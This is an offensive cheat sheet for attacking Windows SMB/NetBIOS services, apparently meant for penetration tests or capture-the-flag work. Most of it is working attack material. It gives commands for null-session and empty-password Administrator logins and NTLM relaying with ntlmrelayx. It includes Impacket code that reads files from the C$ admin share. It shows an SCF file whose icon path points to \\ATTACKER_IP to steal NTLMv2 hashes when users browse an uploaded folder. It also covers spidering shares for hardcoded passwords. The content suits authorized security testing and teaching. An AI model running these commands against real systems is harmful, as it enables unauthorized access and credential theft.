# SMB/NetBIOS Attacks

Exploiting Windows file sharing and name service vulnerabilities.

## Techniques
- **Null Sessions**: Anonymous access to shares and user enumeration
- **Relay Attacks**: NTLM relay for credential abuse
- **Enumeration**: User, group, share, and policy enumeration
- **EternalBlue**: MS17-010 SMB exploitation

## Tools
- smbclient, enum4linux, CrackMapExec, Impacket, nmap

## Quick Commands
```bash
# Enumerate shares (anonymous)
smbclient -L //target -N
enum4linux -a target

# Null session
rpcclient -U "" -N target

# Built-in accounts with empty password (try before anything else on Windows)
smbclient -L //target -U Administrator -N
smbclient //target/C$ -U Administrator -N
# Also try: Guest, admin, sa

# CrackMapExec
crackmapexec smb target -u '' -p '' --shares

# NTLM relay
ntlmrelayx.py -t target -smb2support
```

## Impacket Python Fallback
When smbclient/rpcclient are unavailable, use impacket directly:
```python
from impacket.smbconnection import SMBConnection
from io import BytesIO

conn = SMBConnection(target, target, timeout=10)
conn.login('Administrator', '')  # empty password
shares = conn.listShares()
for s in shares:
    print(s['shi1_netname'][:-1])

# Read file from admin share
buf = BytesIO()
conn.getFile('C$', 'Users/Administrator/Desktop/flag.txt', buf.write)
print(buf.getvalue().decode())
```

## NTLM Hash Theft via File Upload

When a file upload stores files to a Windows share browsed by users/admins:

```bash
# SCF file — triggers NTLM auth when folder is opened in Explorer
cat > theft.scf << 'EOF'
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# Host SMB listener to capture NTLMv2 hash
smbserver.py -smb2support share ./

# Upload the SCF via the web app, wait for user to browse the share
# Hash appears in smbserver output as NTLMv2-SSP
```

Other UNC trigger files: `.url` (IconFile=), `.lnk` (icon path), `.library-ms`, desktop.ini.

## Post-Auth Share Analysis

After gaining any authenticated SMB access, spider all readable shares for credential leaks:
```bash
# Spider shares for scripts with hardcoded creds
nxc smb target -u user -p pass --spider SHARENAME --pattern '.'
# Look for: .ps1, .bat, .cmd, .vbs, .xml, .config, .ini files
# Common patterns: ConvertTo-SecureString, PSCredential, plaintext passwords in backup/deploy scripts
```

## Guest vs Null Auth

Always test BOTH -- they yield different results:
```bash
nxc smb target -u "" -p "" --shares       # null session
nxc smb target -u "guest" -p "" --shares  # guest account
# Guest often has READ on shares where null auth gets ACCESS_DENIED
```

## Methodology
1. Discover SMB/NetBIOS services (ports 139, 445)
2. Test built-in accounts with empty/null password (Administrator, Guest)
3. Test anonymous null session access -- then test guest separately
4. Enumerate users, groups, shares
5. Spider all readable shares for scripts/configs with credentials
6. Check for relay opportunities
7. If file upload to shared folder exists, try SCF/URL NTLM theft
8. Test for known SMB vulnerabilities

**MITRE**: T1021.002 | **CWE**: CWE-287 | **CAPEC**: CAPEC-555
